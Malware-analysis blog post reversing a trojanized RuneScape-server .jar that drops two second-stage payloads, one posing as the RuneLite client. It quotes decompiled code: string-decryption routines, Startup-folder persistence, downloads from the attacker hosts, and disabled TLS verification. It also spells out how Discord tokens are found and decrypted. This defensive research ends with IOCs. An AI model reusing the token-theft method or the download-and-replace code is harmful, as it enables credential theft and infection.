---
layout: post
title:  "From Game to Gain: How a Malicious .jar Drops Dual Payloads Including a Fake RuneLite with Low Detection"
date:   2025-07-07
---

<p class="intro"><span class="dropcap">F</span>ake RuneScape private server site, ikovrsps[.]org, tricks users into downloading a malicious Ikov.jar file along with Java allegedly required to play the game. It is actually a trojan that steals data, establishes persistence and drops two second-stage payloads: image.exe and images.exe. Both exhibit low detection rates on VirusTotal, with one impersonating the legitimate RuneLite client. Here's how the attack chain unfolds.</p>

Sample can downloaded from <a href="https://www.virustotal.com/gui/file/982e47f604b9b5cbb710f9d6bad16a3e44b0122c44dede726729b843ba357414
" target="_blank">VirusTotal</a>

**SHA256:982e47f604b9b5cbb710f9d6bad16a3e44b0122c44dede726729b843ba357414a**

**Attack Flow Overview**<br>
Before diving into the technical details, let’s take a look at the overall infection chain. The diagram below illustrates how users are lured into running a seemingly harmless .jar file, which then kicks off a series of malicious actions including data theft, persistence and stealthy second-stage payload delivery.

<figure>
	<img src="/assets/img/JavaBasedMalware/Overview_1.jpg" alt=""> 
	<figcaption>Attack Overview</figcaption>
</figure>

### ▶️ **<u>1st Stage - Ikov.jar</u>**

Everything begins when the user visits a malicious game site.
<figure>
	<img src="/assets/img/JavaBasedMalware/Website_2.png" alt=""> 
	<figcaption>Malicious Website</figcaption>
</figure>

Once victims press ‘Play Now’, it will download .JAR file which is malicious
<figure>
	<img src="/assets/img/JavaBasedMalware/Ikovjar_3.png" alt=""> 
	<figcaption>Malicious Java file</figcaption>
</figure>

It then prompts victims to install Java, claiming it is needed to run the game. Since Ikov.jar is a Java file, this adds legitimacy but in reality, it enables the malicious code to execute.
<figure>
	<img src="/assets/img/JavaBasedMalware/Javarequired_4.png" alt=""> 
	<figcaption>Require user to install Java</figcaption>
</figure>

Next, we jump into the analysis of the Ikov.jar file. When analyzing a malicious .jar file, one of the first things I always check is the MANIFEST.MF file. This file lives inside the META-INF/ folder in the archive and usually contains some basic metadata about the Java application including which class runs first when the JAR is executed.

After unzipping the file, I opened up MANIFEST.MF and found this:

{%- highlight java -%}
Manifest-Version: 1.0
Main-Class: FileDownloader
{%- endhighlight -%}
So, the entry point is a class called FileDownloader. This means that when the .jar runs, Java will start from that class’s main() method. That gives us a clear place to begin our deep dive. Before we go further, I noticed there could be 3 interesting files to be investigated which are:
1. Txt’s to zip.txt
2. FileDownloader.class (entry point)
3. RSPS.class
<figure>
	<img src="/assets/img/JavaBasedMalware/insidejar_5.png" alt=""> 
	<figcaption>Inside .jar file</figcaption>
</figure>

#### **Txt’s to zip.txt - Decoded function from malicious FileDownloader.class**
We began our analysis with a .txt file. Upon inspection, it contained the plain text code for the zipDesktopAndDownloadsTxtFiles() function, which turned out to be useful for understanding the malware’s behavior.

#### **FileDownloader.class - Main InfoStealer launch**
Now, let’s decompile FileDownloader.class first to see what it is really doing.

When I opened the .class file in VS Code, it automatically decompiled it using FernFlower on my VScode. I didn’t have to do anything. Just clicked the file and the code popped up in a readable format. Super handy when you are trying to quickly check what the class is doing.

Before even digging into the actual code, I like to scroll through the list of import statements. It gives a quick idea of what the malware might be doing.

Here’s what I saw:
{%- highlight java -%}
import java.awt.Robot;
import java.awt.Toolkit;
import javax.swing.JOptionPane;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.*;
import java.util.zip.*;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
{%- endhighlight -%}

Some of these really stand out. For example:
- Robot, ImageIO, and Toolkit may looks like it might be doing screenshots or something with the screen
- HttpURLConnection and InetAddress probably reaching out to the internet, maybe talking to a server
- javax.crypto and MessageDigest definitely some kind of encryption happening
- JOptionPane maybe it tries to show a fake message box or alert
- ZipOutputStream, file and path stuff possibly zipping up files and doing something shady with them

Even without reading the actual logic yet, this gives off  infoStealer vibes. Let’s dig further.

As you can see here, the code is heavily obfuscated. Here are a few examples.
<figure>
	<img src="/assets/img/JavaBasedMalware/captureScreenshot_6.png" alt=""> 
	<figcaption>Obfuscated Capture Screenshot method</figcaption>
</figure>
<figure>
	<img src="/assets/img/JavaBasedMalware/GetIP_7.png" alt=""> 
	<figcaption>Obfuscated Get IP Address method</figcaption>
</figure>

Looks like the malware is using Base64 strings combined with some sort of key-based decoding to hide its actual text. The function names like lIIIlllIIll, lIIIlllIllI and lIIIlllllll are randomly named (probably by an obfuscator), and the values being passed in are encrypted strings.

So I did some quick searching and comparisons, and I found that the malware was obfuscated using this tool from GitHub:
https://github.com/superblaubeere27/obfuscator

This is a public Java obfuscator that scrambles names, encrypts strings, and makes the code very hard to read. I have seen this one used in a few suspicious samples before, so I was not too surprised when I came across it here.

While analyzing the code, I encountered a function that builds an array of strings using three distinct decryption methods. Here’s a simplified look:
```java
lIIIllllIlll[lIlIIIlllIll[0]] = lIIIlllIIll("S8+Gx1mBYug=", "oYgzM");
lIIIllllIlll[lIlIIIlllIll[1]] = lIIIlllIllI("HxUoIicsKy4nIR8PKC8xLC8yHQY3OTM1dQ49LzQJEyouJiciNTIdBjc5MzUgMwQSMTosNm8kLSY=", "CXAAU");
lIIIllllIlll[lIlIIIlllIll[8]] = lIIIlllllll("VV7IsaU2UXWmKxxGOg/h2a3Hc27ow4CyKpSxhlLIpM7VDNqFr80q2pZK2Vz7ErJx , "jVLzl");
```

All three methods (lIIIlllIIll, lIIIlllIllI, and lIIIlllllll) are used to decrypt different strings during runtime. After digging into the decompiled code, I found the actual functions responsible for decoding these values:
```java
private static String lIIIlllIIll(String llllllllllllllllllIlIIllIIlIIlll, String llllllllllllllllllIlIIllIIlIlIII) {
      try {
         SecretKeySpec llllllllllllllllllIlIIllIIlIllII = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(llllllllllllllllllIlIIllIIlIlIII.getBytes(StandardCharsets.UTF_8)), lIlIIIlllIll[8]), "DES");
         long llllllllllllllllllIlIIllIIlIIlII = Cipher.getInstance("DES");
         llllllllllllllllllIlIIllIIlIIlII.init(lIlIIIlllIll[2], llllllllllllllllllIlIIllIIlIllII);
         return new String(llllllllllllllllllIlIIllIIlIIlII.doFinal(Base64.getDecoder().decode(llllllllllllllllllIlIIllIIlIIlll.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
      } catch (Exception var5) {
         var5.printStackTrace();
         return null;
      }
   }
```
This one uses DES (Data Encryption Standard) to decrypt a Base64-encoded string. The key is hashed using MD5, then used to initialize the DES cipher.
```java
private static String lIIIlllIllI(String llllllllllllllllllIlIIllIIIllIIl, String llllllllllllllllllIlIIllIIIlIIll) {
      llllllllllllllllllIlIIllIIIllIIl = new String(Base64.getDecoder().decode(llllllllllllllllllIlIIllIIIllIIl.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
      StringBuilder llllllllllllllllllIlIIllIIIlIlll = new StringBuilder();
      char[] llllllllllllllllllIlIIllIIIlIllI = llllllllllllllllllIlIIllIIIlIIll.toCharArray();
      double llllllllllllllllllIlIIllIIIlIIII = lIlIIIlllIll[0];
      int llllllllllllllllllIlIIllIIIIllll = llllllllllllllllllIlIIllIIIllIIl.toCharArray();
      Exception llllllllllllllllllIlIIllIIIIlllI = llllllllllllllllllIlIIllIIIIllll.length;

      for(int llllllllllllllllllIlIIllIIIIllIl = lIlIIIlllIll[0]; llllllllllllllllllIlIIllIIIIllIl < llllllllllllllllllIlIIllIIIIlllI; ++llllllllllllllllllIlIIllIIIIllIl) {
         boolean llllllllllllllllllIlIIllIIIIllII = llllllllllllllllllIlIIllIIIIllll[llllllllllllllllllIlIIllIIIIllIl];
         llllllllllllllllllIlIIllIIIlIlll.append((char)(llllllllllllllllllIlIIllIIIIllII ^ llllllllllllllllllIlIIllIIIlIllI[llllllllllllllllllIlIIllIIIlIIII % llllllllllllllllllIlIIllIIIlIllI.length]));
         ++llllllllllllllllllIlIIllIIIlIIII;
      }

      return llllllllllllllllllIlIIllIIIlIlll.toString();
   }
```
This one is a simple XOR decryption method. After decoding the string from Base64, each character is XORed with a character from the key.
```java
private static String lIIIlllllll(String llllllllllllllllllIlIIllIIllIlII, String llllllllllllllllllIlIIllIIllIlIl) {
      try {
         SecretKeySpec llllllllllllllllllIlIIllIIlllIIl = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(llllllllllllllllllIlIIllIIllIlIl.getBytes(StandardCharsets.UTF_8)), "Blowfish");
         int llllllllllllllllllIlIIllIIllIIIl = Cipher.getInstance("Blowfish");
         llllllllllllllllllIlIIllIIllIIIl.init(lIlIIIlllIll[2], llllllllllllllllllIlIIllIIlllIIl);
         return new String(llllllllllllllllllIlIIllIIllIIIl.doFinal(Base64.getDecoder().decode(llllllllllllllllllIlIIllIIllIlII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
      } catch (Exception var4) {
         var4.printStackTrace();
         return null;
      }
   }
```
This function is similar to the one that uses DES, but it uses Blowfish instead. The key is again hashed with MD5 before being used in the cipher.

Now that I have the decryption functions figured out, reversing the obfuscated strings became straightforward. I renamed the functions to make them easier to read during the analysis. Much better than trying to remember what lIIIlllIllI was supposed to do every time. Here is what it looked like after a bit of cleanup.
<figure>
	<img src="/assets/img/JavaBasedMalware/deobCaptureScreenshot_GetIP_8.png" alt=""> 
	<figcaption>De-obfuscated Capture Screenshot and Get IP Address method</figcaption>
</figure>
```java
lIIIllllIlll[lIlIIIlllIll[0]] = DESEncryption("S8+Gx1mBYug=", "oYgzM");
APPDATA

lIIIllllIlll[lIlIIIlllIll[1]] = XOREncryption("HxUoIicsKy4nIR8PKC8xLC8yHQY3OTM1dQ49LzQJEyouJiciNTIdBjc5MzUgMwQSMTosNm8kLSY=", "CXAAU");
\Microsoft\Windows\Start Menu\Programs\Startup\Spoon.exe

lIIIllllIlll[lIlIIIlllIll[8]] = BlowFishEncryption("VV7IsaU2UXWmKxxGOg/h2a3Hc27ow4CyKpSxhlLIpM7VDNqFr80q2pZK2Vz7ErJx", "jVLzl");
❌ Failed to resolve current JAR path: 
```
These decrypted strings already tell us a lot about what the malware is trying to do. For example:
- It is accessing the APPDATA directory
- It places a file called Spoon.exe in the Startup folder to run automatically when the system starts
- It prints an error message when it fails to get the current JAR path, which is probably part of its self-installation logic

Even though the code was heavily obfuscated at first, decrypting these strings helped reveal its true behavior.

After reversing and deobfuscating the JAR malware, I ended up with a very long Java file, almost 1000 lines. The code handles everything from persistence, token stealing, file zipping, screenshot capture, to sending data to an attacker’s webhook.

Since pasting the full code here would make this post unnecessarily long and harder to read, I have uploaded the complete cleaned and readable version of the decompiled malware to GitHub.

👉  **[Complete_DeobfuscatedVersion_FileDownloader.txt](https://github.com/HareezIshraf5/Reverse-Malicious-.jar/blob/main/Complete_DeobfuscatedVersion_FileDownloader.txt)**

I also included the script I wrote to reverse all the encrypted strings used throughout the code. Feel free to check it out if you want to explore the technical details or try reversing something similar on your own.

👉  **[FileDownloader.class decryptor script](https://github.com/HareezIshraf5/Reverse-Malicious-.jar/blob/main/FileDownloaderDecryptor.java)**

In the next section of this write-up, I will go through the key functions and explain how each part of the malware works.
Even though I have uploaded the full source code to GitHub, I still want to highlight the interesting parts here and walk through what this malware is actually doing.

- 🗂️ **Persistence**<br>
One of the first things the malware does is copy itself to the Windows Startup folder as Spoon.exe. This ensures it runs automatically every time the system boots.
```java
String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Spoon.exe";
```

It checks if it is already running from that location. If not, it downloads itself and saves it there using this function:
```java
downloadFile("https://ikovrsps.org/gamefiles/images.exe", startupPath);
```

- 💬 **Fake Error Message**<br>
To trick the user, it pops up a fake error message after running:
```java
JOptionPane.showMessageDialog(errorFrame, "A Java Exception has occurred.");
```
This makes it look like nothing really happened, while in the background it starts its actual tasks.<br>

- 🕵️ **System Information Collection**<br>
It collects the victim’s public IP and PC name:
```java
String hostName = InetAddress.getLocalHost().getHostName();
String publicIP = getPublicIP();
```
- 🪙 **Discord Token Stealer**<br>
It tries to grab any Discord tokens from the system by scanning known directories using the RSPS.getTokens() method (the RSPS class was part of the original obfuscated malware and I reversed it).

- 📸 **Screenshot Capture**<br>
It takes a screenshot of the victim's screen and saves it as a PNG file:
```java 
Robot screenCapturer = new Robot();
BufferedImage screenImage = screenCapturer.createScreenCapture(screenDimensions);
```
This screenshot gets sent to a webhook:
```java 
sendScreenshotToWebhook(screenshotFile);
```

- 📁 **Stealing .txt Files**<br>
It also scans the Desktop and Downloads folders for .txt files, zips them into a file called hussla.zip, and sends the zip to another webhook:
```java
zipDesktopAndDownloadsTxtFiles();
sendZipToWebhook(textFilesZip);
```

- 🧪 **Targeting RuneLite**<br>
The malware searches for a folder named RuneLite (a popular Old School RuneScape client) and replaces the RuneLite.exe file with a malicious one downloaded from the attacker's server:
```java
downloadFile("https://ikovrsps.org/gamefiles/image.exe", runeLiteExePath);
```
Even if the file already exists, it replaces it anyway.

- 🕒 **One-Time or Persistent Mode**<br>
The malware checks if it is already running from the Startup folder. If yes, it enters persistent mode and keeps running in the background using a scheduler. It uses this logic:
```java
if (currentJarPath.equalsIgnoreCase(startupPath)) {
    // Persistent mode - runs every 15 minutes
}
```
In persistent mode, it keeps executing malicious tasks every 15 minutes using a scheduled executor service. If it is not running from the Startup folder, it just runs once and exits. This allows it to blend in and not raise suspicion during initial infection.

To quickly sum it up, here is what this malware does:
- Installs itself in Startup for persistence
- Fakes a Java error to avoid suspicion
- Collects system information (IP, PC name)
- Tries to steal Discord tokens
- Takes a screenshot and sends it out
- Zips up text files from Desktop and Downloads
- Replaces the RuneLite client with a trojanized one
- Runs again every 15 minutes if installed in Startup

NOTE: If you want to see the full deobfuscated source code and the script I used to reverse it, feel free to check out my GitHub repo for the complete version.
[https://github.com/HareezIshraf5/Reverse-Malicious-.jar](https://github.com/HareezIshraf5/Reverse-Malicious-.jar)<br><br>


#### **RSPS.class – Discord Token Stealer**

Before we jump into the second-stage payloads which are images.exe and image.exe from:
```python
https://ikovrsps.org/gamefiles/images.exe  
https://ikovrsps.org/gamefiles/image.exe
```
Let’s take a closer look at the RSPS class first.

Just like FileDownloader.class, RSPS was also heavily obfuscated. Below are two interesting examples showing how the original obfuscated methods looked and how I deobfuscated them for better readability:
<figure>
	<img src="/assets/img/JavaBasedMalware/Token_9.png" alt=""> 
	<figcaption>Obfuscated SearchToken method</figcaption>
</figure>
<figure>
	<img src="/assets/img/JavaBasedMalware/deobsToken_10.png" alt=""> 
	<figcaption>De-obfuscated SearchToken method</figcaption>
</figure>
<figure>
	<img src="/assets/img/JavaBasedMalware/getToken_11.png" alt=""> 
	<figcaption>Obfuscated getToken method</figcaption>
</figure>
<figure>
	<img src="/assets/img/JavaBasedMalware/deobGetToken_12.png" alt=""> 
	<figcaption>De-obfuscated getToken method</figcaption>
</figure>
The RSPS class is responsible for stealing Discord authentication tokens from the victim’s system. Here’s how it works:
**Locates Token Files**
It scans the folder:
```java
%APPDATA%\discord\Local Storage\leveldb\
```
1. This is where Discord stores tokens locally.
2. Looks for a Marker
 It searches for the string dQw4w9WgXcQ: (yes, that’s a RickRoll ID — but it’s used in Discord token formatting).

**Extracts the Encryption Key**
The token decryption key is stored in:
```java
%APPDATA%\discord\Local State
```
 3. It reads the encrypted_key from the os_crypt section in the JSON file.
 4. Decrypts the Key Using DPAPI
 It uses Crypt32Util.cryptUnprotectData() to decrypt the key with Windows’ built-in APIs
 5. Decrypts the Tokens
 Tokens are decrypted using AES/GCM/NoPadding:
    - First 3 bytes: header
    - Next 12 bytes: IV
    - Remaining: ciphertext

### ▶️ **<u>2nd Stage - Payload Analysis</u>**

Now that we have taken a good look at the first stage and how it sets the persistence, stealing tokens, capturing screenshots, etc.. Now it's time to dive into the second stage.

As mentioned earlier, the malware reaches out to download two additional payloads from the attacker's server:
```java
https://ikovrsps.org/gamefiles/images.exe
https://ikovrsps.org/gamefiles/image.exe
```
These two files act as stage 2 binaries which also **have very low detection on VirusTotal**, downloaded and executed after the initial infection. Let's take a closer look at what each of them does.

#### 🧩 ***images.exe – First Second-Stage Payload***
[3b1b5cb1ff5b4c5c72b0a459501a3116cdc0682ba5a7b578a432059d64fe4d24](https://www.virustotal.com/gui/file/3b1b5cb1ff5b4c5c72b0a459501a3116cdc0682ba5a7b578a432059d64fe4d24)
<figure>
	<img src="/assets/img/JavaBasedMalware/VT1_13.png" alt=""> 
	<figcaption>images/spoon.exe on VirusTotal</figcaption>
</figure>
When analyzing images.exe, I noticed some interesting strings during static analysis with FLOSS, such as:
```java
--l4j-no-splash  
--l4j-dont-wait  
--l4j-debug  
Exit code:\t0  
Launch4j 
```
These are command-line arguments and debug messages typically associated with Launch4j, a utility used to convert Java programs into Windows .exe files.

This tells us 2 things:
    1. The payload is likely a Java application (again). It is just wrapped in a Windows    executable to make it easier to run and appear native.
    2. Launch4j was used to build it, which also helps bypass some detections or user   suspicion (since it runs as an EXE).

Next, I opened the EXE file like an archive, and inside it was the same FileDownloader.class that we saw earlier in the JAR file. So although the malware is delivered as an EXE, it is actually just a Java class packaged inside.
<figure>
	<img src="/assets/img/JavaBasedMalware/imagesEXE_14.png" alt=""> 
	<figcaption>Inside images.exe</figcaption>
</figure>
This confirms that the EXE is built using Launch4j, a tool that wraps Java programs to make them look like normal Windows applications.

The FileDownloader.class inside it is almost identical to the one from the original JAR file. The functions and logic are pretty much the same.

The only real difference is the encryption key. It looks like the attacker reused the same code but swapped the key, likely to load a different payload or to bypass detection.

#### 🧩 ***image.exe – Second Second-Stage Payload***
[e5935de81cee8f22e9a32605994ded05c9eb8b805a369cb78eb8ea543ff96bad](https://www.virustotal.com/gui/file/e5935de81cee8f22e9a32605994ded05c9eb8b805a369cb78eb8ea543ff96bad)
<figure>
	<img src="/assets/img/JavaBasedMalware/VT2_15.png" alt=""> 
	<figcaption>Inside images.exe</figcaption>
</figure>
image.exe uses Launch4j and pretends to be a legit RuneLite launcher but in reality, it is a trojanized version that quietly downloads and runs malicious components in the background.

From the manifest file inside image.exe, we can see the following metadata:
```java
Manifest-Version: 1.0  
Created-By: Maven Jar Plugin 3.2.0  
Build-Jdk-Spec: 17  
Main-Class: net.runelite.launcher.Launcher
```
This tells us the entry point of the application is net.runelite.launcher.Launcher, so I proceeded to analyze this class in detail.

Turns out, the code is not obfuscated and it is easy to read.

- 💀 **Malicious Code Injection**<br>
The Launcher class (decompiled from a .class file) contains modified logic to fetch and execute malicious payloads:
Malicious Downloads
{%- highlight java -%}
// Downloads a fake RuneLite.exe
InputStream in8 = (new URL("https://stellaspicy.org/gamefiles/RuneLite.exe")).openStream();
Files.copy(in8, winExe.toPath(), StandardCopyOption.REPLACE_EXISTING);

// Downloads additional JARs (likely malicious plugins)
InputStream in3 = (new URL("https://stellaspicy.org/gamefiles/example-5.4.jar")).openStream();
Files.copy(in3, LOADTHIS.toPath(), StandardCopyOption.REPLACE_EXISTING);
{%- endhighlight -%}

OS-Specific Payloads<br>
- Windows:
    - Replaces RuneLite.exe with a malicious version.
    - Drops EthanVannInstaller.jar (unknown purpose).
    - Downloads hussdfs.jar (possible RAT/keylogger).<br>
- MacOS:
    - Similar behavior but with macOS-specific paths (/Applications/RuneLite.app/).<br><br>
    
    
- 🛠️ **Persistence & Evasion Techniques**<br>
File Replacement:
```java
File existingExe = new File(WIN_INSTALLER_PATH, "RuneLite.exe");
File renamedExe = new File(WIN_INSTALLER_PATH, "RuneLite1.exe");
if (existingExe.exists()) {
    Files.move(existingExe.toPath(), renamedExe.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
```

Renames the legitimate executable before dropping the malicious one.

Sideloading Malicious Plugins:
```java
SIDELOAD = new File(RUNELITE_DIR, "sideloaded-plugins");
LOADTHIS = new File(SIDELOAD, "Externals.jar");
Loads external JARs (likely malware or spyware).
```
- 🌐 **Network Communication**<br>

The malware connects to stellaspicy.org to fetch:
- RuneLite.exe (Trojanized client)
- EthanVannInstaller.jar (Unknown malicious JAR)
- hussdfs.jar (Possible backdoor)
- config.json (Likely C2 configuration)
```java
// Downloads a configuration file (possibly C2 settings)
in3 = (new URL("https://stellaspicy.org/gamefiles/config.json")).openStream();
Files.copy(in3, windowsJson.toPath(), StandardCopyOption.REPLACE_EXISTING);
```

🛡️ **Anti-Analysis & Defense Evasion**<br>
No TLS Verification – Disables SSL checks to avoid certificate warnings:
```java
HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
```
The malware ensures it can communicate with its C2 server even if the certificate is self-signed or flagged as suspicious. This bypass helps avoid red flags during sandbox analysis or user inspection.

IOCs<br>
Files:<br>
982e47f604b9b5cbb710f9d6bad16a3e44b0122c44dede726729b843ba357414
e5935de81cee8f22e9a32605994ded05c9eb8b805a369cb78eb8ea543ff96bad
3b1b5cb1ff5b4c5c72b0a459501a3116cdc0682ba5a7b578a432059d64fe4d24

URLs:<br>
ikovrsps[.]org<br>
stellaspicy[.]org
